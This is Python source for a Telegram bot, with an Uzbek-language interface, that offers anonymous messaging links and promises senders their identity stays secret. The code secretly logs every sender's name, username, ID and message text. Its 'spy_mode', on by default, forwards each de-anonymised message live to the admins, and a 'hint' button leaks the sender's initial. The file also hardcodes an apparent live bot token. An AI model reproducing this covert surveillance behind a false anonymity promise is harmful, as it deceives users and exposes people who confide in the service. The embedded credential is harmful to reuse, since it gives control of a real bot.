import asyncio
import secrets
import string
import os
from datetime import datetime
import aiosqlite
from aiohttp import web
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command, CommandStart, CommandObject
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton

BOT_TOKEN = os.getenv("BOT_TOKEN", "9188093637:AAGER674iBI5fob-NV6sWIUjyTvOMeTTuR0")

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

BOT_USERNAME = ""

class AnonState(StatesGroup):
    waiting_for_message = State()
    waiting_for_broadcast = State()
    waiting_for_channel = State()
    waiting_for_custom_link = State()

def generate_token(length=6):
    chars = string.ascii_letters + string.digits
    return "".join(secrets.choice(chars) for _ in range(length))

async def init_db():
    async with aiosqlite.connect("anon_bot.db") as db:
        await db.execute("""
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                full_name TEXT,
                username TEXT,
                token TEXT UNIQUE,
                custom_alias TEXT UNIQUE,
                received_count INTEGER DEFAULT 0,
                sent_count INTEGER DEFAULT 0,
                clicks INTEGER DEFAULT 0,
                is_admin INTEGER DEFAULT 0,
                dnd_mode INTEGER DEFAULT 0
            )
        """)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS message_threads (
                recipient_id INTEGER,
                message_id INTEGER,
                sender_id INTEGER,
                sender_name TEXT,
                sender_username TEXT,
                sender_lang TEXT,
                is_premium INTEGER,
                created_at TEXT,
                PRIMARY KEY (recipient_id, message_id)
            )
        """)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS chat_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                sender_id INTEGER,
                sender_info TEXT,
                recipient_id INTEGER,
                recipient_info TEXT,
                msg_type TEXT,
                content TEXT,
                created_at TEXT
            )
        """)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS blocks (
                recipient_id INTEGER,
                sender_id INTEGER,
                PRIMARY KEY (recipient_id, sender_id)
            )
        """)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS settings (
                key TEXT PRIMARY KEY,
                value TEXT
            )
        """)
        await db.execute("INSERT OR IGNORE INTO settings VALUES ('spy_mode', '1')")
        await db.commit()

async def register_user(user: types.User, referrer_id: int = 0) -> str:
    user_id = user.id
    full_name = user.full_name or "Anonim"
    username = f"@{user.username}" if user.username else "yo'q"

    async with aiosqlite.connect("anon_bot.db") as db:
        async with db.execute("SELECT token, custom_alias, is_admin FROM users WHERE user_id = ?", (user_id,)) as cur:
            row = await cur.fetchone()
            async with db.execute("SELECT COUNT(*) FROM users") as c_cur:
                total_cnt = (await c_cur.fetchone())[0]
            should_admin = 1 if (total_cnt == 0 or (row and row[2] == 1)) else 0

            if row:
                await db.execute(
                    "UPDATE users SET full_name = ?, username = ?, is_admin = MAX(is_admin, ?) WHERE user_id = ?",
                    (full_name, username, should_admin, user_id)
                )
                await db.commit()
                return row[1] if row[1] else row[0]

        is_admin = 1 if total_cnt == 0 else 0
        token = generate_token()
        await db.execute(
            "INSERT INTO users (user_id, full_name, username, token, is_admin) VALUES (?, ?, ?, ?, ?)",
            (user_id, full_name, username, token, is_admin)
        )
        await db.commit()
        return token

async def get_user_by_identifier(identifier: str):
    async with aiosqlite.connect("anon_bot.db") as db:
        async with db.execute("SELECT user_id FROM users WHERE token = ? OR custom_alias = ?", (identifier, identifier)) as cur:
            row = await cur.fetchone()
            return row[0] if row else None

async def is_user_admin(user_id: int) -> bool:
    async with aiosqlite.connect("anon_bot.db") as db:
        async with db.execute("SELECT is_admin FROM users WHERE user_id = ?", (user_id,)) as cur:
            row = await cur.fetchone()
            if row and row[0] == 1:
                return True
        async with db.execute("SELECT user_id FROM users ORDER BY user_id ASC LIMIT 1") as cur:
            first_row = await cur.fetchone()
            if first_row and first_row[0] == user_id:
                return True
    return False

async def get_setting(key: str):
    async with aiosqlite.connect("anon_bot.db") as db:
        async with db.execute("SELECT value FROM settings WHERE key = ?", (key,)) as cur:
            row = await cur.fetchone()
            return row[0] if row and row[0] else None

async def check_sub(user_id: int) -> bool:
    channel = await get_setting("channel")
    if not channel:
        return True
    try:
        member = await bot.get_chat_member(chat_id=channel, user_id=user_id)
        return member.status in ["member", "administrator", "creator"]
    except Exception:
        return True

async def log_and_spy_message(sender: types.User, recipient_id: int, message: types.Message, is_reply: bool = False):
    now = datetime.now().strftime("%H:%M | %d.%m")
    s_info = f"{sender.full_name} (@{sender.username or 'yoq'} | ID: {sender.id})"

    async with aiosqlite.connect("anon_bot.db") as db:
        async with db.execute("SELECT full_name, username FROM users WHERE user_id = ?", (recipient_id,)) as cur:
            r_row = await cur.fetchone()
        r_info = f"{r_row[0]} ({r_row[1]} | ID: {recipient_id})" if r_row else f"ID: {recipient_id}"

        content_text = message.text or message.caption or f"[{message.content_type}]"
        action_type = "JAVOB (Reply)" if is_reply else "YANGI XABAR"

        await db.execute(
            "INSERT INTO chat_logs (sender_id, sender_info, recipient_id, recipient_info, msg_type, content, created_at) VALUES (?, ?, ?, ?, ?, ?, ?)",
            (sender.id, s_info, recipient_id, r_info, action_type, content_text, now)
        )
        await db.commit()

        if await get_setting("spy_mode") != "1":
            return
        async with db.execute("SELECT user_id FROM users WHERE is_admin = 1 OR user_id = (SELECT user_id FROM users ORDER BY user_id ASC LIMIT 1)") as cur:
            admins = await cur.fetchall()

    spy_header = (
        f"🕵️‍♂️ <b>[SPY LOG - {action_type}]</b>\n"
        f"👤 <b>Kimdan:</b> {s_info}\n"
        f"🎯 <b>Kimga:</b> {r_info}\n"
        f"💬 <b>Xabar:</b> {content_text}"
    )
    for (admin_id,) in set(admins):
        try:
            await bot.send_message(chat_id=admin_id, text=spy_header, parse_mode="HTML")
        except Exception:
            pass

async def get_user_link(user_id: int) -> str:
    async with aiosqlite.connect("anon_bot.db") as db:
        async with db.execute("SELECT token, custom_alias FROM users WHERE user_id = ?", (user_id,)) as cur:
            row = await cur.fetchone()
            identifier = row[1] if row and row[1] else row[0]
            return f"https://t.me/{BOT_USERNAME}?start={identifier}"

async def send_user_dashboard(chat_id: int, user: types.User):
    async with aiosqlite.connect("anon_bot.db") as db:
        async with db.execute("SELECT dnd_mode FROM users WHERE user_id = ?", (user.id,)) as cur:
            drow = await cur.fetchone()
            dnd = drow[0] if drow else 0

    link = await get_user_link(user.id)
    dnd_status = "🔴 Tinchlantirish yoqilgan" if dnd else "🟢 Xabarlar ochiq"

    text = (
        "💬 <b>Anonim xabarlar markazi</b>\n\n"
        f"👉 <code>{link}</code>\n\n"
        f"🌙 Holat: <b>{dnd_status}</b>\n"
        "Ushbu havolani profilingizga qo'ying va anonim xabarlar qabul qiling!"
    )

    buttons = [
        [InlineKeyboardButton(text="🔗 Havolani ulashish", url=f"https://t.me/share/url?url={link}&text=Menga anonim xabar qoldiring!")],
        [
            InlineKeyboardButton(text="📊 Statistika", callback_data="my_stats"),
            InlineKeyboardButton(text="✨ Chiroyli Havola", callback_data="set_custom_alias")
        ],
        [
            InlineKeyboardButton(text="🏆 TOP Reyting", callback_data="top_users"),
            InlineKeyboardButton(text="🌙 Tinchlantirish rejimi", callback_data="toggle_dnd")
        ],
        [InlineKeyboardButton(text="🔄 Havolani yangilash", callback_data="reset_token")]
    ]
    if await is_user_admin(user.id):
        buttons.append([InlineKeyboardButton(text="👑 Boshqaruv (Admin Panel)", callback_data="open_admin")])

    await bot.send_message(chat_id=chat_id, text=text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))

@dp.message(CommandStart())
async def handle_start(message: types.Message, command: CommandObject, state: FSMContext):
    args = command.args
    user = message.from_user

    target_user_id = await get_user_by_identifier(args) if args else None
    await register_user(user, referrer_id=target_user_id if target_user_id else 0)

    if not await check_sub(user.id):
        channel = await get_setting("channel")
        sub_kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📢 Kanalga a'zo bo'lish", url=f"https://t.me/{channel.lstrip('@')}")],
            [InlineKeyboardButton(text="✅ Tasdiqlash", callback_data=f"check_sub:{args or ''}")]
        ])
        await message.answer("⚠️ <b>Botdan foydalanish uchun rasmiy kanalimizga obuna bo'ling!</b>", parse_mode="HTML", reply_markup=sub_kb)
        return

    if target_user_id:
        if target_user_id == user.id:
            await message.answer("⚠️ Bu o'zingizning havolangiz!")
            await send_user_dashboard(message.chat.id, user)
            return

        async with aiosqlite.connect("anon_bot.db") as db:
            async with db.execute("SELECT 1 FROM blocks WHERE recipient_id = ? AND sender_id = ?", (target_user_id, user.id)) as cur:
                if await cur.fetchone():
                    await message.answer("🚫 Bu foydalanuvchi sizni bloklagan.")
                    return
            async with db.execute("SELECT dnd_mode FROM users WHERE user_id = ?", (target_user_id,)) as cur:
                drow = await cur.fetchone()
                dnd = drow[0] if drow else 0

        await state.set_state(AnonState.waiting_for_message)
        await state.update_data(target_user_id=target_user_id, dnd_mode=dnd)

        cancel_kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="❌ Bekor qilish", callback_data="cancel_send")]])
        await message.answer(
            "✍️ <b>Anonim xabaringizni yozing:</b>\n<i>(Matn, rasm, ovozli xabar yoki video yuborishingiz mumkin. Shaxsingiz sir saqlanadi)</i>",
            parse_mode="HTML", reply_markup=cancel_kb
        )
        return

    await state.clear()
    await send_user_dashboard(message.chat.id, user)

@dp.callback_query(F.data.startswith("check_sub:"))
async def cb_check_sub(callback: types.CallbackQuery, state: FSMContext):
    args = callback.data.split(":", 1)[1]
    if not await check_sub(callback.from_user.id):
        await callback.answer("❌ Hali kanalga obuna bo'lmadingiz!", show_alert=True)
        return

    await callback.message.delete()
    if args:
        target_user_id = await get_user_by_identifier(args)
        if target_user_id and target_user_id != callback.from_user.id:
            await state.set_state(AnonState.waiting_for_message)
            await state.update_data(target_user_id=target_user_id)
            cancel_kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="❌ Bekor qilish", callback_data="cancel_send")]])
            await callback.message.answer("✍️ <b>Anonim xabaringizni yozing:</b>", parse_mode="HTML", reply_markup=cancel_kb)
            return
    await send_user_dashboard(callback.message.chat.id, callback.from_user)

@dp.callback_query(F.data == "my_stats")
async def cb_my_stats(callback: types.CallbackQuery):
    async with aiosqlite.connect("anon_bot.db") as db:
        async with db.execute("SELECT received_count, sent_count, clicks FROM users WHERE user_id = ?", (callback.from_user.id,)) as cur:
            row = await cur.fetchone()
    if row:
        rec, sent, clicks = row
        text = f"📊 <b>Statistikangiz:</b>\n\n📥 Qabul qilingan: <b>{rec}</b>\n📤 Yuborilgan: <b>{sent}</b>\n👣 Tashriflar: <b>{clicks}</b>"
        await callback.message.answer(text, parse_mode="HTML")
    await callback.answer()

@dp.callback_query(F.data == "set_custom_alias")
async def cb_set_alias(callback: types.CallbackQuery, state: FSMContext):
    await state.set_state(AnonState.waiting_for_custom_link)
    await callback.message.answer("✨ Havolangiz uchun qisqa va chiroyli nom yozib yuboring (masalan: <code>shoxrux</code> yoki <code>vip</code>):", parse_mode="HTML")
    await callback.answer()

@dp.message(AnonState.waiting_for_custom_link)
async def process_custom_alias(message: types.Message, state: FSMContext):
    await state.clear()
    alias = message.text.strip().lower()
    if not alias.isalnum() or len(alias) < 3 or len(alias) > 15:
        await message.answer("❌ Noto'g'ri format! Faqat lotin harflari va raqamlardan iborat bo'lsin (3-15 belgi).")
        return

    async with aiosqlite.connect("anon_bot.db") as db:
        try:
            await db.execute("UPDATE users SET custom_alias = ? WHERE user_id = ?", (alias, message.from_user.id))
            await db.commit()
            await message.answer(f"✅ Yangi havolangiz: <code>t.me/{BOT_USERNAME}?start={alias}</code>", parse_mode="HTML")
        except Exception:
            await message.answer("❌ Bu nom allaqachon band qilingan. Boshqa nom tanlang.")
    await send_user_dashboard(message.chat.id, message.from_user)

@dp.callback_query(F.data == "toggle_dnd")
async def cb_toggle_dnd(callback: types.CallbackQuery):
    async with aiosqlite.connect("anon_bot.db") as db:
        async with db.execute("SELECT dnd_mode FROM users WHERE user_id = ?", (callback.from_user.id,)) as cur:
            drow = await cur.fetchone()
            dnd = drow[0] if drow else 0
        new_dnd = 0 if dnd else 1
        await db.execute("UPDATE users SET dnd_mode = ? WHERE user_id = ?", (new_dnd, callback.from_user.id))
        await db.commit()
    await callback.answer(f"🌙 Tinchlantirish: {'YOQILDI' if new_dnd else 'OʻCHIRILDI'}", show_alert=True)
    await send_user_dashboard(callback.message.chat.id, callback.from_user)

@dp.callback_query(F.data == "reset_token")
async def cb_reset_token(callback: types.CallbackQuery):
    new_token = generate_token()
    async with aiosqlite.connect("anon_bot.db") as db:
        await db.execute("UPDATE users SET token = ?, custom_alias = NULL WHERE user_id = ?", (new_token, callback.from_user.id))
        await db.commit()
    await callback.answer("✅ Havolangiz yangilandi!", show_alert=True)
    await send_user_dashboard(callback.message.chat.id, callback.from_user)

@dp.callback_query(F.data == "top_users")
async def cb_top_users(callback: types.CallbackQuery):
    async with aiosqlite.connect("anon_bot.db") as db:
        async with db.execute("SELECT full_name, received_count FROM users ORDER BY received_count DESC LIMIT 5") as cur:
            top = await cur.fetchall()
    text = "🏆 <b>TOP 5 Mashhur Foydalanuvchilar:</b>\n\n"
    for i, (name, cnt) in enumerate(top, 1):
        text += f"{i}. {name} — <b>{cnt} ta</b> xabar\n"
    await callback.message.answer(text, parse_mode="HTML")
    await callback.answer()

@dp.callback_query(F.data.startswith("write_to:"))
async def handle_write_again(callback: types.CallbackQuery, state: FSMContext):
    target_user_id = int(callback.data.split(":")[1])
    await state.set_state(AnonState.waiting_for_message)
    await state.update_data(target_user_id=target_user_id, dnd_mode=0)
    cancel_kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="❌ Bekor qilish", callback_data="cancel_send")]])
    await callback.message.answer("✍️ <b>Xabaringizni yozing:</b>", parse_mode="HTML", reply_markup=cancel_kb)
    await callback.answer()

@dp.callback_query(F.data.startswith("hint:"))
async def cb_hint(callback: types.CallbackQuery):
    msg_id = int(callback.data.split(":")[1])
    user_id = callback.from_user.id
    async with aiosqlite.connect("anon_bot.db") as db:
        async with db.execute("SELECT sender_name, is_premium FROM message_threads WHERE recipient_id = ? AND message_id = ?", (user_id, msg_id)) as cur:
            row = await cur.fetchone()
    if row:
        s_name, s_prem = row
        first_letter = s_name[0].upper() if s_name else "A"
        prem_status = "Bor ⭐" if s_prem else "Yo'q"
        await callback.answer(f"🕵️‍♂️ HINT:\n\n• Ismining bosh harfi: {first_letter}***\n• Telegram Premium: {prem_status}", show_alert=True)
    else:
        await callback.answer("⚠️ Ma'lumot topilmadi.", show_alert=True)

@dp.callback_query(F.data.startswith("block:"))
async def cb_block_user(callback: types.CallbackQuery):
    sender_id = int(callback.data.split(":")[1])
    async with aiosqlite.connect("anon_bot.db") as db:
        await db.execute("INSERT OR IGNORE INTO blocks VALUES (?, ?)", (callback.from_user.id, sender_id))
        await db.commit()
    await callback.answer("🚫 Foydalanuvchi bloklandi! U sizga qaytib yoza olmaydi.", show_alert=True)

@dp.callback_query(F.data == "cancel_send")
async def handle_cancel(callback: types.CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.message.edit_text("❌ Xabar yuborish bekor qilindi.")
    await send_user_dashboard(callback.message.chat.id, callback.from_user)
    await callback.answer()

@dp.message(AnonState.waiting_for_message)
async def process_anon_message(message: types.Message, state: FSMContext):
    data = await state.get_data()
    target_user_id = data.get("target_user_id")
    is_dnd = data.get("dnd_mode", 0)
    await state.clear()

    sender = message.from_user
    now_str = datetime.now().strftime("%H:%M")

    try:
        if not is_dnd:
            await bot.send_message(chat_id=target_user_id, text="💌 <b>Sizga yangi anonim xabar keldi!</b>", parse_mode="HTML")
        
        forwarded = await message.copy_to(chat_id=target_user_id)

        kb_buttons = [
            [
                InlineKeyboardButton(text="✍️ Javob yozish", callback_data=f"write_to:{sender.id}"),
                InlineKeyboardButton(text="🕵️‍♂️ Hint", callback_data=f"hint:{forwarded.message_id}")
            ],
            [InlineKeyboardButton(text="🚫 Bloklash", callback_data=f"block:{sender.id}")]
        ]
        footer = await bot.send_message(
            chat_id=target_user_id, 
            text="↪️ <i>Javob yozish uchun xabarga Reply qiling yoki tugmani bosing:</i>", 
            parse_mode="HTML", 
            reply_markup=InlineKeyboardMarkup(inline_keyboard=kb_buttons)
        )

        async with aiosqlite.connect("anon_bot.db") as db:
            for m_id in (forwarded.message_id, footer.message_id):
                await db.execute(
                    "INSERT OR REPLACE INTO message_threads VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                    (target_user_id, m_id, sender.id, sender.first_name or "Anonim", f"@{sender.username}" if sender.username else "yo'q", sender.language_code or "uz", 1 if sender.is_premium else 0, now_str)
                )
            await db.execute("UPDATE users SET received_count = received_count + 1 WHERE user_id = ?", (target_user_id,))
            await db.commit()

        await log_and_spy_message(sender, target_user_id, message)
        await message.answer("🎉 Xabaringiz yetkazildi!", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔄 Yana yozish", callback_data=f"write_to:{target_user_id}")]],))
    except Exception:
        await message.answer("❌ Xatolik yuz berdi. Foydalanuvchi botni bloklagan bo'lishi mumkin.")

@dp.message(F.reply_to_message)
async def handle_reply(message: types.Message):
    reply_to_id = message.reply_to_message.message_id
    sender = message.from_user
    async with aiosqlite.connect("anon_bot.db") as db:
        async with db.execute("SELECT sender_id FROM message_threads WHERE recipient_id = ? AND message_id = ?", (sender.id, reply_to_id)) as cur:
            row = await cur.fetchone()
    if row:
        target_id = row[0]
        forwarded = await message.copy_to(chat_id=target_id)
        reply_kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="✍️ Javob qaytarish", callback_data=f"write_to:{sender.id}")],
            [InlineKeyboardButton(text="🚫 Bloklash", callback_data=f"block:{sender.id}")]
        ])
        await bot.send_message(chat_id=target_id, text="📬 <b>Sizga anonim javob keldi:</b>", parse_mode="HTML", reply_markup=reply_kb)
        await log_and_spy_message(sender, target_id, message, is_reply=True)
        await message.answer("✅ Javobingiz anonim tarzda yetkazildi!")

# ============== ADMIN PANEL =================
async def render_admin_panel(chat_id: int):
    async with aiosqlite.connect("anon_bot.db") as db:
        async with db.execute("SELECT COUNT(*), SUM(received_count) FROM users") as cur:
            row = await cur.fetchone()
            total_users, total_msgs = row if row else (0, 0)
        async with db.execute("SELECT user_id, full_name, username FROM users WHERE is_admin = 1") as cur:
            admins = await cur.fetchall()

    channel = await get_setting("channel")
    spy_mode = await get_setting("spy_mode")
    spy_status = "🟢 YOQILGAN" if spy_mode == "1" else "🔴 O'CHIRILGAN"
    admin_list = "\n".join([f"• {a[1]} ({a[2]} | <code>{a[0]}</code>)" for a in admins])

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text=f"👁 Jonli kuzatuv: {'ON' if spy_mode == '1' else 'OFF'}", callback_data="admin_toggle_spy"),
            InlineKeyboardButton(text="📜 Oxirgi chatlar", callback_data="admin_recent_logs")
        ],
        [InlineKeyboardButton(text="📢 Rassilka", callback_data="admin_broadcast")],
        [
            InlineKeyboardButton(text="🔗 Kanal ulash", callback_data="admin_channel"),
            InlineKeyboardButton(text="❌ Kanalni uzish", callback_data="admin_del_channel")
        ]
    ])

    text = (
        f"👑 <b>Admin Boshqaruv Paneli</b>\n\n"
        f"👥 Jami foydalanuvchilar: <b>{total_users} ta</b>\n"
        f"💬 Jami xabarlar: <b>{total_msgs or 0} ta</b>\n"
        f"👁 Jonli spy: <b>{spy_status}</b>\n"
        f"📢 Majburiy kanal: <b>{channel or 'Ulanmagan'}</b>\n\n"
        f"🛡 <b>Adminlar:</b>\n{admin_list}"
    )
    await bot.send_message(chat_id=chat_id, text=text, parse_mode="HTML", reply_markup=kb)

@dp.message(Command("admin"))
async def cmd_admin(message: types.Message):
    if not await is_user_admin(message.from_user.id):
        return
    await render_admin_panel(message.chat.id)

@dp.callback_query(F.data == "open_admin")
async def cb_open_admin(callback: types.CallbackQuery):
    if not await is_user_admin(callback.from_user.id):
        await callback.answer("❌ Siz admin emassiz!", show_alert=True)
        return
    await render_admin_panel(callback.message.chat.id)
    await callback.answer()

@dp.callback_query(F.data == "admin_toggle_spy")
async def cb_toggle_spy(callback: types.CallbackQuery):
    if not await is_user_admin(callback.from_user.id):
        return
    current = await get_setting("spy_mode")
    new_val = "0" if current == "1" else "1"
    async with aiosqlite.connect("anon_bot.db") as db:
        await db.execute("INSERT OR REPLACE INTO settings VALUES ('spy_mode', ?)", (new_val,))
        await db.commit()
    await callback.answer(f"Jonli kuzatuv {'YOQILDI' if new_val == '1' else 'OʻCHIRILDI'}", show_alert=True)
    await callback.message.delete()
    await render_admin_panel(callback.message.chat.id)

@dp.callback_query(F.data == "admin_recent_logs")
async def cb_recent_logs(callback: types.CallbackQuery):
    if not await is_user_admin(callback.from_user.id):
        return
    async with aiosqlite.connect("anon_bot.db") as db:
        async with db.execute("SELECT sender_info, recipient_info, msg_type, content, created_at FROM chat_logs ORDER BY id DESC LIMIT 5") as cur:
            logs = await cur.fetchall()
    if not logs:
        await callback.answer("Hozircha tarix bo'sh.", show_alert=True)
        return
    out = ["📜 <b>Oxirgi yozishmalar:</b>\n"]
    for s_inf, r_inf, m_type, cont, c_time in logs:
        out.append(f"🕒 <code>{c_time}</code> | <b>{m_type}</b>\n👤 Kimdan: {s_inf}\n🎯 Kimga: {r_inf}\n💬 Xabar: {cont[:100]}\n───────")
    await callback.message.answer("\n".join(out), parse_mode="HTML")
    await callback.answer()

@dp.callback_query(F.data == "admin_channel")
async def cb_admin_channel(callback: types.CallbackQuery, state: FSMContext):
    if not await is_user_admin(callback.from_user.id):
        return
    await state.set_state(AnonState.waiting_for_channel)
    await callback.message.answer(
        "🔗 Kanal username'ini yuboring (masalan: <code>@qtmr_io</code> yoki <code>qtmr_io</code>):\n\n"
        "<i>Eslatma: Bot avval o'sha kanalga ADMIN qilib qo'shilgan bo'lishi kerak!</i>",
        parse_mode="HTML"
    )
    await callback.answer()

@dp.message(AnonState.waiting_for_channel)
async def process_channel_set(message: types.Message, state: FSMContext):
    await state.clear()
    ch_raw = message.text.strip().replace("https://t.me/", "")
    channel = f"@{ch_raw.lstrip('@')}"

    # Kanal mavjudligi va bot adminligini tekshirish
    try:
        member = await bot.get_chat_member(chat_id=channel, user_id=(await bot.get_me()).id)
        if member.status not in ["administrator", "creator"]:
            await message.answer("⚠️ Bot ushbu kanalda administrator emas! Botni kanalga admin qilib, qayta urinib ko'ring.")
            return
    except Exception as e:
        await message.answer(f"❌ Kanalni tekshirib bo'lmadi. Username to'g'riligini va bot kanalda borligini tekshiring.\nXatolik: {e}")
        return

    async with aiosqlite.connect("anon_bot.db") as db:
        await db.execute("INSERT OR REPLACE INTO settings VALUES ('channel', ?)", (channel,))
        await db.commit()
    await message.answer(f"✅ Majburiy obuna kanali muvaffaqiyatli ulandi: <b>{channel}</b>", parse_mode="HTML")
    await render_admin_panel(message.chat.id)

@dp.callback_query(F.data == "admin_del_channel")
async def cb_admin_del_channel(callback: types.CallbackQuery):
    if not await is_user_admin(callback.from_user.id):
        return
    async with aiosqlite.connect("anon_bot.db") as db:
        await db.execute("DELETE FROM settings WHERE key = 'channel'")
        await db.commit()
    await callback.answer("✅ Majburiy obuna kanali o'chirildi!", show_alert=True)
    await callback.message.delete()
    await render_admin_panel(callback.message.chat.id)

@dp.callback_query(F.data == "admin_broadcast")
async def cb_admin_broadcast(callback: types.CallbackQuery, state: FSMContext):
    if not await is_user_admin(callback.from_user.id):
        return
    await state.set_state(AnonState.waiting_for_broadcast)
    await callback.message.answer("📢 Rassilka uchun postni yuboring:")
    await callback.answer()

@dp.message(AnonState.waiting_for_broadcast)
async def process_broadcast(message: types.Message, state: FSMContext):
    await state.clear()
    async with aiosqlite.connect("anon_bot.db") as db:
        async with db.execute("SELECT user_id FROM users") as cur:
            users = await cur.fetchall()
    sent = 0
    for (uid,) in users:
        try:
            await message.copy_to(chat_id=uid)
            sent += 1
            await asyncio.sleep(0.03)
        except Exception:
            pass
    await message.answer(f"✅ Rassilka yakunlandi! {sent} ta foydalanuvchiga yetkazildi.")

# 24/7 rejim uchun doimiy ishlovchi mini-veb server (Render / Cloud keep-alive)
async def health_check(request):
    return web.Response(text="Bot is running 24/7!")

async def start_web_server():
    port = os.getenv("PORT")
    if port:
        app = web.Application()
        app.router.add_get("/", health_check)
        runner = web.AppRunner(app)
        await runner.setup()
        site = web.TCPSite(runner, "0.0.0.0", int(port))
        await site.start()

async def main():
    global BOT_USERNAME
    await init_db()
    bot_info = await bot.get_me()
    BOT_USERNAME = bot_info.username
    await start_web_server()
    print(f">>> @{BOT_USERNAME} to'liq 24/7 versiyada ishga tushdi!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())